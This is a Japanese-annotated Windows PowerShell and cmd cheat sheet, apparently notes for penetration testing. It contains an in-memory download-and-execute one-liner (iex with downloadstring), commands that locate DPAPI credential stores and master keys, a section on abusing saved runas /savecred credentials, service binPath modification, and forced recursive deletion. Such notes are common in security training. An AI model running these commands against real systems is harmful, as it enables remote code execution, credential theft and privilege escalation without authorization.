# Discovery
```powershell
whoami /priv
cmdkey /list
Get-Process
Get-Process -name <Process>
ps
tasklist /v
netstat -ano
```

# icacls
```powershell
icacls <File / Directory>
(I) # 親フォルダの設定がそのファイルに継承される。
(F) # フルコントロール
(RX) # 読み取りと実行
```

# File
ファイル操作関連のコマンド。
```bash
new-item <File>
"" > <File>
remove-item <File>
remove-item <Directory> -recurse # サブフォルダ、隠しファイルなどを含める
rmdir <Directory>
del <File>
rd /s /q <Directory> # サブフォルダ含め、強制削除
-force # 強制削除
get-childitem -force # すべてのファイル表示
dir -force # すべてのファイル表示
```

# sc
```powershell
sc.exe start <Service>
sc.exe stop <Service>
sc.exe query <Service> # サービスの状態
sc.exe config <Service> binPath="<Path / Command>" # binPathの変更
sc.exe qc <Service> # サービス詳細確認
```

# File download
```
wget <URL> -o <File path>
iwr -uri <URL> -o <File path>
```

# iex
ファイルをダウンロードせずにメモリ上で実行する。
```
iex (new-object net.webclient).downloadstring('<URL>')
```

# net
```powershell
net user # 全ユーザー表示
net use # マウントしているドライブを表示
net use \\<Host>\<Share> /user:<User> <Password> # 外部フォルダ接続
net use X: \\<Host>\<Share> # Xドライブに外部フォルダをマウント
net use X: \\<Host>\<Share> /user:<User> <Password> # Xドライブに外部フォルダをマウント、認証あり
net use X: /delete # マウント削除
```
# DPAPI
Data Protection APIの略で、パスワード、クッキー、証明書などを暗号化して保存するためのAPI。
`/savecred`などの資格情報もDPAPIによって暗号化されてディスクに保存されている。
DPAPIで暗号化されたファイルを復号するにはMasterkeyが必要で、`dir /S /AS`を使って探すことができる。
`runas /savecred`、資格情報を記憶するにチェック、Outlookなどがパスワードを保存しているといった場合に下記のコマンドで探すことができる。
```
dir /S /AS C:\Users\<User>\AppData\Local\Microsoft\Vault # ブラウザの自動補完、アプリケーションが保存したパスワード
dir /S /AS C:\Users\<User>\AppData\Local\Microsoft\Credentials # ローカル端末関連のパスワード
dir /S /AS C:\Users\<User>\AppData\Local\Microsoft\Protect # 端末固有のデータのmasterkey
dir /S /AS C:\Users\<User>\AppData\Roaming\Microsoft\Vault # あまり使われない
dir /S /AS C:\Users\<User>\AppData\Roaming\Microsoft\Credentials # ドメインネットワーク内の共有フォルダのアクセス権や/savecredなどのデータ
dir /S /AS C:\Users\<User>\AppData\Roaming\Microsoft\Protect # ユーザーごとのデータのmasterkey
```
## /savecredの悪用
`cmdkey /list`で確認できた場合、下記のコマンドでそのパスワードを使用して実行。  
`runas /user:<ユーザー> /savecred "<コマンド>"`

# attrib
```
attrib -H -S <Hidden files> # 隠しとシステム属性を解除
```
